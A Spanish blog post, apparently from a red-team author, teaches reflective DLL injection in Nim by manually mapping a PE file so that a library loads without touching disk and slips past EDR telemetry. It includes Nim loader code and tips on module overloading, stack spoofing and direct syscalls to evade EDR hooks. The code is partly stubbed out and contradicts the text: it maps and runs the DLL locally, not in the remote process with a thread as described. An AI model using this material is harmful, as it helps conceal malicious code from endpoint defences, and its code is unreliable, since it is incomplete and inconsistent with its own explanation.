---
title: "Inyeccion reflectiva de DLL en Nim: bypass del loader"
date: 2026-02-04
description: "Analisis profundo del mapeo manual de PE en Nim para inyectar librerias sin tocar disco ni usar APIs estandar de Windows."
image: /images/blog/dll_injection.png
tags: ["red-team", "malware-dev", "nim", "evasion"]
featured: false
---

La inyeccion reflectiva de DLL ha sido un estandar en el arsenal Red Team durante anos. Sin embargo, los dias de usar la tecnica original de Stephen Fewer y esperar bypass de EDRs modernos quedaron atras. Hoy veremos como implementar una version avanzada con Nim, centrada en el mapeo manual para mantener el maximo sigilo posible.

La idea central es simple: en lugar de dejar que LoadLibrary haga el trabajo (lo que dispara multiples puntos de telemetria), actuamos como el loader PE de Windows.

# Flujo de mapeo manual

Para mapear una DLL en un proceso remoto, seguimos los mismos pasos que haria el sistema operativo:

1. Parseo del header PE: leer los headers para saber donde van las secciones.

2. Asignacion de memoria: encontrar un espacio para la DLL en el proceso objetivo.

3. Mapeo de secciones: copiar .text, .data y otras secciones a sus offsets relativos.

4. Reubicacion base: corregir direcciones si no obtenemos la base preferida.

5. Resolucion de imports: cargar manualmente las funciones necesarias.

6. Ejecucion: invocar el entry point DllMain.

## Definir estructuras PE en Nim

La FFI de Nim facilita el trabajo con APIs de Windows. Primero definimos estructuras que Nim no incluye por defecto.

```nim
import winim/lean

type
    IMAGE_BASE_RELOCATION {.pure.} = object
        VirtualAddress: DWORD
        SizeOfBlock: DWORD

    IMAGE_IMPORT_DESCRIPTOR {.pure.} = object
        OriginalFirstThunk: DWORD
        TimeDateStamp: DWORD
        ForwarderChain: DWORD
        Name: DWORD
        FirstThunk: DWORD
```

## Paso 1: asignacion de memoria y mapeo de secciones

Primero asignamos memoria en el proceso objetivo. En lugar de RWX (Read-Write-Execute), que es una alerta clara, asignamos RW y luego cambiamos a RX para las secciones de codigo.

```nim
proc mapSections(buffer: pointer, baseAddress: pointer): void =
    let ntHeader = cast[PIMAGE_NT_HEADERS](cast[ByteAddress](buffer) + cast[PIMAGE_DOS_HEADER](buffer).e_lfanew)
    let sectionHeader = cast[PIMAGE_SECTION_HEADER](cast[ByteAddress](ntHeader) + sizeof(IMAGE_NT_HEADERS))

    for i in 0 ..< ntHeader.FileHeader.NumberOfSections:
        let section = cast[PIMAGE_SECTION_HEADER](cast[ByteAddress](sectionHeader) + (i * sizeof(IMAGE_SECTION_HEADER)))
        let dest = cast[pointer](cast[ByteAddress](baseAddress) + section.VirtualAddress)
        let src = cast[pointer](cast[ByteAddress](buffer) + section.PointerToRawData)
        
        copyMem(dest, src, section.SizeOfRawData)
```

## Paso 2: proceso de reubicacion

Como rara vez obtenemos la base preferida, calculamos el "delta" (diferencia entre la base preferida y la real) y lo aplicamos a cada direccion absoluta.

```nim
proc applyRelocations(buffer: pointer, baseAddress: pointer, delta: int64): void =
    # Logica para iterar IMAGE_DIRECTORY_ENTRY_BASERELOC
    # y parchear direcciones en memoria
    discard
```

## Paso 3: resolucion de imports

Aqui ocurren muchas detecciones. En lugar de llamar repetidamente a GetProcAddress, podemos parsear la tabla de exports de ntdll.dll o kernel32.dll para encontrar funciones.

```nim
proc resolveImports(baseAddress: pointer): void =
    let ntHeader = cast[PIMAGE_NT_HEADERS](cast[ByteAddress](baseAddress) + cast[PIMAGE_DOS_HEADER](baseAddress).e_lfanew)
    let importDir = ntHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]
    
    # Iterar IMAGE_IMPORT_DESCRIPTORs
    # Cargar DLLs requeridas y fijar la IAT (Import Address Table)
```

## Por que Nim para esto

Nim ofrece un balance unico: control de bajo nivel como C con sintaxis moderna. Ademas, winim provee bindings solidos. Al compilar, Nim genera C, lo que permite aplicar ofuscacion avanzada a nivel de codigo fuente antes de llegar a un compilador como MinGW o MSVC.

## Ejecucion final

Con la DLL mapeada y corregida, lanzamos un thread hacia DllMain.

```nim
let dllMain = cast[proc(hinst: HINSTANCE, reason: DWORD, reserved: LPVOID): BOOL {.stdcall.}](
    cast[ByteAddress](baseAddress) + ntHeader.OptionalHeader.AddressOfEntryPoint
)

dllMain(cast[HINSTANCE](baseAddress), DLL_PROCESS_ATTACH, nil)
```

# Consideraciones de sigilo

Para llevar esto a nivel profesional, considera:

* Module Overloading: mapear tu DLL sobre una DLL legitima ya cargada.

* Stack Spoofing: ocultar la direccion de retorno del thread para apuntar a codigo legitimo.

* Custom Syscalls: usar Nim para NtAllocateVirtualMemory via syscalls directas para evitar hooks de EDR.

Este enfoque es mucho mas robusto que la inyeccion basica. No deja archivos en disco y evita los hooks mas comunes usados por defensas.
